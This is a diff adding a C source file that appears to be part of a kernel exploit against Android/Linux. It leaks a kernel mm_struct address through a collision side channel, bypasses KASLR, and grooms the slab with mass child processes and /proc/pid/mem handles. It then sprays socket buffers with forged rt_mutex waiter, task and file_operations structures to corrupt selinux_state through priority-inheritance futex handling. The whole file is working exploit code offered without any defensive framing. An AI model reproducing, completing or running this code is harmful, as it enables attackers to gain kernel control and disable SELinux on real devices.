@@ -1,0 +1,586 @@
+#include "common.h"
+#include "kernelsnitch/kernelsnitch.h"
+
+static struct kernelsnitch_shared_state *ks;
+static size_t mm_objs_per_slab;
+static unsigned char *skb_buf;
+static int reclaim_sv[2] = {-1, -1};
+static struct mm_ctx prepare_ctx;
+static struct mm_ctx spray_ctx;
+static struct mm_ctx pre_ctx;
+static struct mm_ctx post_ctx;
+static pid_t child_leak;
+
+uintptr_t page_base;
+uintptr_t fake_lock;
+uintptr_t fake_w0;
+uintptr_t fake_task;
+uintptr_t fake_parent;
+uintptr_t fake_right;
+uintptr_t fake_left;
+uintptr_t fake_fops;
+uintptr_t pselect_custom_target;
+char ashmem_path[256] = "/dev/ashmem";
+
+void set_pselect_write_target(uintptr_t target) {
+  pselect_custom_target = target;
+}
+
+void clear_pselect_write(void) {
+  pselect_custom_target = 0;
+}
+
+void read_first_line(const char *path, char *buf, size_t len) {
+  if (!len) {
+    return;
+  }
+  snprintf(buf, len, "unreadable");
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return;
+  }
+  ssize_t n = read(fd, buf, len - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n <= 0) {
+    errno = saved_errno;
+    snprintf(buf, len, "unreadable");
+    return;
+  }
+  buf[n] = 0;
+  buf[strcspn(buf, "\r\n")] = 0;
+}
+
+void log_startup_context(void) {
+  char attr[256];
+  char enforce[32];
+  char status[4096];
+  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
+  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
+  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
+  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    ssize_t n = read(fd, status, sizeof(status) - 1);
+    close(fd);
+    if (n > 0) {
+      status[n] = 0;
+      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
+      char values[3][32] = {"?", "?", "?"};
+      for (size_t i = 0; i < 3; i++) {
+        char *p = strstr(status, names[i]);
+        if (p) {
+          p += strlen(names[i]);
+          while (*p == '\t' || *p == ' ') {
+            p++;
+          }
+          size_t len = strcspn(p, "\r\n");
+          if (len >= sizeof(values[i])) {
+            len = sizeof(values[i]) - 1;
+          }
+          memcpy(values[i], p, len);
+          values[i][len] = 0;
+        }
+      }
+      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
+               "Seccomp_filters=%s", values[0], values[1], values[2]);
+    }
+  }
+  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
+             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
+             enforce);
+  pr_success("startup limits pid=%d %s\n", getpid(), limits);
+  pr_success("build config pid=%d label=%s route=pselect kaslr=bypassed\n",
+             getpid(), BUILD_VARIANT_LABEL);
+}
+
+void disable_rseq_for_thread(void) {
+  return;
+}
+
+long futex_op(uint32_t *uaddr, int op, uint32_t val,
+              const struct timespec *timeout, uint32_t *uaddr2,
+              uint32_t val3) {
+  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
+}
+
+long sched_setattr_tid(int tid, int nice_value) {
+  struct local_sched_attr attr;
+  memset(&attr, 0, sizeof(attr));
+  attr.size = sizeof(attr);
+  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
+  attr.sched_nice = nice_value;
+  errno = 0;
+  long ret = syscall(274, tid, &attr, 0);
+  if (ret != 0) {
+    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
+  }
+  return ret;
+}
+
+int try_cache_ashmem_path(const char *path) {
+  int fd = open(path, O_RDWR | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+
+  close(fd);
+  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
+  return 1;
+}
+
+int same_rdev_path(const char *path, dev_t rdev) {
+  struct stat st;
+  if (stat(path, &st) != 0) {
+    return 0;
+  }
+  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
+}
+
+void init_ashmem_path(void) {
+  char boot_id[128];
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
+    close(fd);
+    if (n > 0) {
+      boot_id[n] = 0;
+      boot_id[strcspn(boot_id, "\r\n")] = 0;
+
+      char path[256];
+      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
+      if (try_cache_ashmem_path(path)) {
+        return;
+      }
+    }
+  }
+
+  struct stat base;
+  int have_base = stat("/dev/ashmem", &base) == 0;
+  have_base = have_base && S_ISCHR(base.st_mode);
+  DIR *dir = opendir("/dev");
+  if (dir && have_base) {
+    struct dirent *de;
+    while ((de = readdir(dir)) != NULL) {
+      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
+          strcmp(de->d_name, "ashmem") == 0) {
+        continue;
+      }
+
+      char path[256];
+      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
+      if (same_rdev_path(path, base.st_rdev) &&
+          try_cache_ashmem_path(path)) {
+        closedir(dir);
+        return;
+      }
+    }
+  }
+  if (dir) {
+    closedir(dir);
+  }
+}
+
+uintptr_t p0_data_alias(uintptr_t image_addr) {
+  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
+  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+}
+
+uintptr_t data_addr(uintptr_t image_addr) {
+  return p0_data_alias(image_addr);
+}
+
+uintptr_t kaslr_image_addr(uintptr_t image_addr) {
+  if (!kaslr_done) {
+    return image_addr;
+  }
+  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
+}
+
+uintptr_t text_addr(uintptr_t image_addr) {
+  return kaslr_image_addr(image_addr);
+}
+
+void put64(unsigned char *p, size_t off, uint64_t value) {
+  memcpy(p + off, &value, sizeof(value));
+}
+
+void put32(unsigned char *p, size_t off, uint32_t value) {
+  memcpy(p + off, &value, sizeof(value));
+}
+
+void put_fake_fops_table(unsigned char *p, size_t off) {
+  put64(p, off + FOPS_OWNER_OFF, 0);
+  put64(p, off + FOPS_LLSEEK_OFF,
+        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+  put64(p, off + FOPS_READ_OFF, 0);
+  put64(p, off + FOPS_WRITE_OFF, 0);
+  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
+  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
+  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
+  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
+  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
+  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
+  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
+  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+}
+
+pid_t clone_child(void) {
+  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(0);
+    }
+    pin_to_core(CORE);
+    for (;;) {
+      pause();
+    }
+  }
+  return child;
+}
+
+pid_t clone_leak_child(void) {
+  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  if (child == 0) {
+    kernelsnitch_find_collisions(ks);
+    exit(0);
+  }
+  return child;
+}
+
+int open_memfd(pid_t child) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/%d/mem", child);
+  return SYSCHK(open(path, O_RDONLY));
+}
+
+void kill_child(pid_t child) {
+  if (child <= 0) {
+    return;
+  }
+  SYSCHK(kill(child, SIGKILL));
+  SYSCHK(waitpid(child, NULL, 0));
+}
+
+void close_reclaim_sockets(void) {
+  for (int i = 0; i < 2; i++) {
+    if (reclaim_sv[i] >= 0) {
+      close(reclaim_sv[i]);
+      reclaim_sv[i] = -1;
+    }
+  }
+}
+
+void close_ctx_memfds(struct mm_ctx *ctx) {
+  for (size_t i = 0; i < ctx->mm_cnt; i++) {
+    if (ctx->memfds[i] > 0) {
+      close(ctx->memfds[i]);
+      ctx->memfds[i] = -1;
+    }
+  }
+}
+
+void free_ctx_storage(struct mm_ctx *ctx) {
+  free(ctx->childs);
+  free(ctx->memfds);
+  ctx->childs = NULL;
+  ctx->memfds = NULL;
+  ctx->mm_cnt = 0;
+}
+
+void cleanup_page_prepare_state(void) {
+  close_ctx_memfds(&prepare_ctx);
+  close_ctx_memfds(&spray_ctx);
+  close_ctx_memfds(&pre_ctx);
+  close_ctx_memfds(&post_ctx);
+  if (memfd_leak > 0) {
+    close(memfd_leak);
+    memfd_leak = -1;
+  }
+  free_ctx_storage(&prepare_ctx);
+  free_ctx_storage(&spray_ctx);
+  free_ctx_storage(&pre_ctx);
+  free_ctx_storage(&post_ctx);
+  free(skb_buf);
+  skb_buf = NULL;
+}
+
+void prepare_ctxs(void) {
+  int prepare_slabs = env_int_range("PREPARE_SLABS", 32, 4, 64);
+  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
+  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
+  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
+
+  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
+  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
+  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);
+
+  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
+  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
+  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);
+
+  post_ctx.mm_cnt = mm_objs_per_slab;
+  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
+  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
+}
+
+int prepare_skb_payload(uintptr_t base) {
+  memset(skb_buf, 0, SKB_SEND_SIZE);
+
+  uintptr_t payload_base = base + SKB_DATA_DELTA;
+
+  fake_lock = payload_base + LOCK_OFF;
+  fake_w0 = payload_base + W0_OFF;
+  fake_task = payload_base + FAKE_TASK_OFF;
+  fake_fops = payload_base + FOPS_TABLE_OFF;
+
+  /* Write 1 (SELinux): child node = base+0x100 → byte0=0 (enforcing), byte1=1 */
+  fake_right = base + 0x100;
+  fake_left = 0;
+  fake_parent = pselect_custom_target - 8;
+
+  uintptr_t write_pc = fake_parent;
+  uintptr_t write_right = fake_right;
+  uintptr_t write_left = fake_left;
+  uint64_t waiter_task = text_addr(INIT_TASK);
+  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
+  uint64_t pi_top_task = text_addr(INIT_TASK);
+
+  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+
+    put32(p, LOCK_OFF + 0x00, 0);
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, fake_task | 1);
+
+    put64(p, W0_OFF + 0x00, 1);
+    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x10, 0);
+    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+    /* Empty pi_waiters: erase uses W0's parent pointers (not root), re-insert
+     * finds an empty tree → sole root → no rebalancing, so the insert never
+     * touches selinux_state. */
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+
+    put64(p, RIGHT_OFF + 0x00, fake_parent);
+    put64(p, RIGHT_OFF + 0x08, 0);
+    put64(p, RIGHT_OFF + 0x10, 0);
+
+    put64(p, LEFT_OFF + 0x00, fake_parent);
+    put64(p, LEFT_OFF + 0x08, 0);
+    put64(p, LEFT_OFF + 0x10, 0);
+
+    put_fake_fops_table(p, FOPS_TABLE_OFF);
+  }
+  return 1;
+}
+
+uintptr_t prepare_kernel_page(void) {
+  close_reclaim_sockets();
+  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  prepare_ctxs();
+
+  skb_buf = malloc(SKB_SEND_SIZE);
+  memset(skb_buf, 0x41, SKB_SEND_SIZE);
+
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    prepare_ctx.childs[i] = clone_child();
+    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
+  }
+
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+    spray_ctx.childs[i] = clone_child();
+    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
+  }
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    pre_ctx.childs[i] = clone_child();
+  }
+  child_leak = clone_leak_child();
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    post_ctx.childs[i] = clone_child();
+  }
+
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
+  }
+  memfd_leak = open_memfd(child_leak);
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
+  }
+
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    kill_child(pre_ctx.childs[i]);
+  }
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    kill_child(post_ctx.childs[i]);
+  }
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+    kill_child(spray_ctx.childs[i]);
+  }
+  SYSCHK(waitpid(child_leak, NULL, 0));
+
+  if (!kernelsnitch_found_collisions(ks)) {
+    pr_warning("KernelSnitch collision finding failed\n");
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
+  kernelsnitch_bruteforce(ks);
+  uintptr_t leaked = ks->mm_struct;
+  if (leaked == (uintptr_t)-1) {
+    pr_warning("KernelSnitch mm_struct leak failed\n");
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
+  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  if (!prepare_skb_payload(base)) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+  int sndbuf = 1 << 20;
+  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
+  if (reclaim_flags >= 0) {
+    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
+  }
+  int pcp_shaping_sv[2];
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
+
+  struct iovec iov;
+  memset(&iov, 0, sizeof(iov));
+  iov.iov_base = skb_buf;
+  iov.iov_len = SKB_SEND_SIZE;
+
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+
+  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+
+  pin_to_core(CORE);
+  sched_yield();
+  sched_yield();
+  sched_yield();
+  sched_yield();
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    SYSCHK(close(pre_ctx.memfds[i]));
+    pre_ctx.memfds[i] = -1;
+  }
+  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
+    SYSCHK(close(post_ctx.memfds[i]));
+    post_ctx.memfds[i] = -1;
+  }
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+    SYSCHK(close(spray_ctx.memfds[i]));
+    spray_ctx.memfds[i] = -1;
+  }
+
+  SYSCHK(close(pcp_shaping_sv[0]));
+  SYSCHK(close(pcp_shaping_sv[1]));
+  sched_yield();
+  sched_yield();
+  sched_yield();
+  sched_yield();
+  SYSCHK(close(memfd_leak));
+  memfd_leak = -1;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    errno = 0;
+    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+    if (sent <= 0) {
+      break;
+    }
+  }
+  kernelsnitch_cleanup(ks);
+  ks = NULL;
+
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    SYSCHK(close(prepare_ctx.memfds[i]));
+    prepare_ctx.memfds[i] = -1;
+    kill_child(prepare_ctx.childs[i]);
+  }
+
+  return base;
+}
+
+uintptr_t prepare_good_kernel_page(void) {
+  int max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 4, 72);
+  struct timespec deadline;
+  clock_gettime(CLOCK_MONOTONIC, &deadline);
+  deadline.tv_sec += 180;
+  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    uintptr_t base = prepare_kernel_page();
+    if (base) {
+      pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
+      return base;
+    }
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    if (now.tv_sec >= deadline.tv_sec) {
+      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
+      break;
+    }
+    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
+  }
+  return 0;
+}
+
+int env_flag(const char *name, int def) {
+  char *v = getenv(name);
+  if (!v) return def;
+  return atoi(v);
+}
+
+int env_int_range(const char *name, int def, int min, int max) {
+  char *v = getenv(name);
+  if (!v) return def;
+  int val = (int)strtol(v, NULL, 0);
+  if (val < min) return min;
+  if (val > max) return max;
+  return val;
+}
